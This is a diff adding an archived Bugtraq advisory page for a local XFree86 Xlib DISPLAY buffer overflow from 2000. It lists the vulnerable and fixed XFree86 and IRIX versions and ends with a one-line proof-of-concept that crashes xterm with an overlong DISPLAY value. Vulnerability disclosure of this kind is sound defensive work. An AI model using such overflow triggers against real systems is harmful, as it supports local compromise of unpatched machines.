@@ -1,0 +1,175 @@
+#SpeeDr00t@Black Falcon<br>#bid1805<p><b><span style="font-size: 18pt;">XFree86 Xlib Display Buffer Overflow Vulnerability</span></b></p><br><br><a href="http://www.securityfocus.com/bid/1805/info">info</a><br><a href="http://www.securityfocus.com/bid/1805/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/1805/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/1805/solution">solution</a><br><a href="http://www.securityfocus.com/bid/1805/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				1805
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Boundary Condition Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Oct 12 2000 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Oct 12 2000 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				This vulnerability was reported to bugtraq by Michal Zalewski &lt;lcamtuf@tpi.pl&gt; on Thu, 12 Oct 2000.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					XFree86 X11R6 3.3.6 <br/>
+<span class="related">
+						
+							+ 
+						
+						Debian Linux 2.2 <br/>
+</span>
+<span class="related">
+						
+							+ 
+						
+						Redhat Linux  6.2<br/>
+</span>
+					
+				
+					XFree86 X11R6 3.3.5 <br/>
+<span class="related">
+						
+							-
+						
+						Redhat Linux 6.1  i386<br/>
+</span>
+					
+				
+					XFree86 X11R6 3.3.4 <br/>
+					
+				
+					XFree86 X11R6 3.3.3 <br/>
+					
+				
+					SGI IRIX 6.5.11 <br/>
+					
+				
+					SGI IRIX 6.5.10 <br/>
+					
+				
+					SGI IRIX 6.5.9 <br/>
+					
+				
+					SGI IRIX 6.5.8 <br/>
+					
+				
+					SGI IRIX 6.5.7 <br/>
+					
+				
+					SGI IRIX 6.5.6 <br/>
+					
+				
+					SGI IRIX 6.5.5 <br/>
+					
+				
+					SGI IRIX 6.5.4 <br/>
+					
+				
+					SGI IRIX 6.5.3 <br/>
+					
+				
+					SGI IRIX 6.5.2 <br/>
+					
+				
+					SGI IRIX 6.5.1 <br/>
+					
+				
+					SGI IRIX 6.5 <br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+				
+					XFree86 X11R6 4.0 <br/>
+					
+				
+					SGI IRIX 6.5.16 <br/>
+					
+				
+					SGI IRIX 6.5.15 <br/>
+					
+				
+					SGI IRIX 6.5.14 <br/>
+					
+				
+					SGI IRIX 6.5.13 <br/>
+					
+				
+					SGI IRIX 6.5.12 <br/>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	cwsys$ DISPLAY=:`perl -e '{print "0"x128}'` xterm<br/>Segmentation fault<br/>cwsys$ 
+	
+		<ul>
+</ul>
+</div>
